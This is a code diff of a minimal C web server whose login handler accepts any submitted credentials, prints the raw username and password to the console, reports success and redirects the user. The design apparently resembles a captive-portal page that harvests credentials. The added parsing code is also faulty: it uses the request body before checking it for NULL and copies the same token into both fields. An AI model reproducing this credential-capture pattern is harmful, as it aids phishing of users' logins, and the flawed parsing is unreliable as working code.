@@ -29,9 +29,10 @@ void serve_static_file(int client_socket, const char* filename, const char* cont
              "HTTP/1.1 200 OK\r\n"
              "Content-Type: %s\r\n"
              "Content-Length: %ld\r\n\r\n", content_type, file_size);
-
     send(client_socket, response_headers, strlen(response_headers), 0);
+
     send(client_socket, buffer, file_size, 0);
+
     free(buffer);
     fclose(file);
 }
@@ -48,21 +49,29 @@ void redirect_user(int client_socket) {
     send(client_socket, redirect_response, strlen(redirect_response), 0);
 }
 
+#define UN_LEN 64
 void handle_login(int client_socket, const char* request, const char* client_ip) {
+    char username[UN_LEN], password[UN_LEN];
     char* body = strstr(request, "\r\n\r\n");
+
+    printf("%s", body);
+
+    snprintf(username, UN_LEN, "%s", body);
+    char* token = strtok(username, "&");
+    snprintf(password, UN_LEN, "%s", token );
+    
     if (body) {
         body += 4;  // Skip the \r\n\r\n to get to the actual body
-        sscanf(body, "username=%s&password=%s", username, password);
-        printf("Received credentials: %s", body);
+        // sscanf(body, "username=%63s[^&]&password=%63s", username, password);
+        // printf("Received credentials: Username=%s, Password=%s\n", username, password);
+        printf("%s", body);
 
-        // Send an HTTP response indicating success
         const char* success_response = 
             "HTTP/1.1 200 OK\r\n"
             "Content-Type: text/html\r\n\r\n"
             "<html><body><h2>Login successful!</h2><p>You will be redirected...</p></body></html>";
         send(client_socket, success_response, strlen(success_response), 0);
 
-        // Redirect the user to the internet (after a delay, or instantly)
         redirect_user(client_socket);
     }
 }
@@ -117,6 +126,7 @@ int main(int argc, char *argv[]) {
                 serve_html(client_socket, html_file_path);
             }
             else if (strncmp(buffer, "POST /login", 11) == 0) {
+                printf("%s", buffer);
                 handle_login(client_socket, buffer, client_ip);
             }
         }
